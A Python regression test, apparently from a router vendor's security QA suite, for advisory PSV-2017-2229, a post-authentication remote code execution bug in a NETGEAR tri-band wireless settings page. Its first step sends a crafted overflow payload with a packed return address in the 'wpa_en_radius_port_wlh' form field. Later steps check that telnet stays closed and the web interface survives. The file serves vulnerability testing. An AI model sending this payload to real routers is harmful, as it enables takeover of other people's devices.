'''	[PSV-2017-2229] Post-Auth RCe via wpa_en_radius_port_wlh on WLG_wireless_tri_band.htm '''
''' anthor Cloud 2017-12-12'''
'''v1.0 '''
from API._API import *

#def test_step_0():
    #log.info( 'step-0-0 dut loaddrfault wait 160s')
    #aploaddefault()
    #log.info( "step-0-1 AP Genie over leap done")
    #Genie_overleap()
#    log.info( "step-0-2 disable changed-url token")
#    Disable_changedToken()

def test_Step_1():
    log.info("step-1 httpd shouldn't be down or DUT shouldn't be telnet")
    if console_type == 'cable':
        print 'This case NA'
    else:
        url = host + urlLogs
        token = getIDToken(url)
        Authorization = 'Basic ' + base64.b64encode(user + ':' + passwd)
        payload = "1234".ljust(0x14, 'a')
        payload += 'dead' # R4
        payload += 'dead' # R5
        payload += 'dead' # R6
        payload += 'dead' # R7
        payload += struct.pack("I", 0x94dc0)
        data = {
            'Apply':'123',
            'ssid_bc':'ssid_24G_bc',
            'ssid':'NETGEAR88',
            'w_channel':'0',
            'opmode':'300Mbps',
            'security_type':'WPA2-PSK',
            'authAlgm':'automatic',
            'wepenc':'1',
            'wep_key_no':'1',
            'KEY1':'',
            'KEY2':'',
            'KEY3':'',
            'KEY4':'',
            'passphrase':'wideskates103',
            'encryptmode':'1',
            'wpa_en_gk_int':'3600',
            'RADIUSAddr1_wla':'',
            'RADIUSAddr2_wla':'',
            'RADIUSAddr3_wla':'',
            'RADIUSAddr4_wla':'',
            'wpa_en_radius_port':'1812',
            'wpa_en_radius_ss':'',
            'ssid_bc_an':'ssid_5G_bc',
            'ssid_an':'NETGEAR88-5G',
            'w_channel_an':'44',
            'opmode_an':'HT80',
            'security_type_an':'WPA2-PSK',
            'authAlgm_an':'automatic',
            'wepenc_an':'1',
            'wep_key_no_an':'1',
            'KEY1_an':'',
            'KEY2_an':'',
            'KEY3_an':'',
            'KEY4_an':'',
            'passphrase_an':'wideskates103',
            'encryptmode_an':'2',
            'wpa_en_gk_int_wlg':'3600',
            'RADIUSAddr1_wlg':'111',
            'RADIUSAddr2_wlg':'111',
            'RADIUSAddr3_wlg':'111',
            'RADIUSAddr4_wlg':'111',
            'wpa_en_radius_port_wlg':'1111',
            'wpa_en_radius_ss_wlg':'123',
            'ssid_bc_an_2':'ssid_5G_bc',
            'ssid_an_2':'NETGEAR88-5G-2',
            'w_channel_an_2':'153',
            'opmode_an_2':'HT80',
            'security_type_an_2':'WPA-ENTERPRISE',
            'authAlgm_an_2':'automatic',
            'wepenc_an_2':'1',
            'wep_key_no_an_2':'1',
            'KEY1_an_2':'',
            'KEY2_an_2':'',
            'KEY3_an_2':'',
            'KEY4_an_2':'',
            'passphrase_an_2':'wideskates103',
            'encryptmode_an_2':'2',
            'wpa_en_gk_int_wlh':'3600',
            'RADIUSAddr1_wlh':'111',
            'RADIUSAddr2_wlh':'111',
            'RADIUSAddr3_wlh':'111',
            'RADIUSAddr4_wlh':'111',
            'wpa_en_radius_port_wlh':payload,
            'wpa_en_radius_ss_wlh':'123',
            'sku_name':'NA',
            'tempSetting':'0',
            'tempRegion':'5',
            'setRegion':'11',
            'wds_enable':'0',
            'wds_enable_an':'0',
            'only_mode':'0',
            'band_steering_5g':'0',
            'show_wps_alert':'0',
            'security_type_2G':'WPA2-PSK',
            'security_type_5G':'WPA2-PSK',
            'security_type_5G_2':'WPA-ENTERPRISE',
            'init_security_type_2G':'WPA2-PSK',
            'init_security_type_5G':'WPA-ENTERPRISE',
            'init_security_type_5G_2':'WPA2-PSK',
            'init_passhprase_5G_2':'wideskates103',
            'init_ssid_5G_2':'NETGEAR88-5G-2',
            'initChannel':'0',
            'initAuthType':'automatic',
            'initDefaultKey':'0',
            'initChannel_an':'44',
            'initAuthType_an':'automatic',
            'initDefaultKey_an':'0',
            'initChannel_an_2':'153',
            'initAuthType_an_2':'automatic',
            'initDefaultKey_an_2':'0',
            'telec_dfs_ch_enable':'1',
            'ce_dfs_ch_enable':'',
            'fcc_dfs_ch_enable':'',
            'auto_channel_5G':'1',
            'support_ac_mode':'1',
            'board_id':'U12H334T00_NETGEAR',
            'enable_band_steering':'0',
            'fw_sku':'SKU_WW',
            'fw_sku':'SKU_NA',
            'wla_radius_ipaddr':'0.0.0.0',
            'wlg_radius_ipaddr':'111.111.111.111',
            'wla_ent_secu_type':'WPA-AUTO',
            'wlg_ent_secu_type':'WPA-AUTO',
            'wan_ipaddr':'0.0.0.0',
            'wan_netmask':'0.0.0.0',
            'wlh_radius_ipaddr':'0.0.0.0',
            'wlh_ent_secu_type':'WPA-AUTO',
            'wlh_ent_secu_port':'1812',
            'wlh_ent_secu_interval':'3600',
            'wlh_radius_secret':'',
            'wifi_dual_5g_band':'1',
            'init_ssid_bc_an_2':'checked',
            'init_opmode_an_2':''
        }
        headers = {
            'Host': hostip,
            'Cache-Control': 'max-age=0',
            'Authorization': Authorization,
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
        }
        post_url = host + 'wireless.cgi' + token
        r = requests.post(post_url, headers=headers, data=data,timeout=5)
        log.info(r.status_code)
        post_url = host + urlWirelessSetup
        r1 = requests.post(post_url, headers=headers,timeout=5)
        log.info(r1.status_code)

def test_Step_2():
    log.info( 'step-2 check telnet dut')
    if console_type == 'cable':
        print 'This case NA'
        str2 = 'fail'
    else:
        str2 = judjeduttelnet()
        if str2 == 'pass':
            log.info(str2)
            log.info( "check telnet dut pass")
            time.sleep(1)
        else:
            log.info(str2)
            log.info( "check telnet dut fail")
    assert str2 == 'pass', "This action should work." 

def test_Step_3():
    log.info( 'step-3 Make sure the Web GUI should not crash')
    if console_type == 'cable':
        print 'This case NA'
        str = 'fail'
    else:
        url = "http://" + user + ':' + passwd + "@" + hostip + '/' + urlDevicecontrol
        str = check_DUTnocrash(url)
    assert str == 'pass', "This action should work." 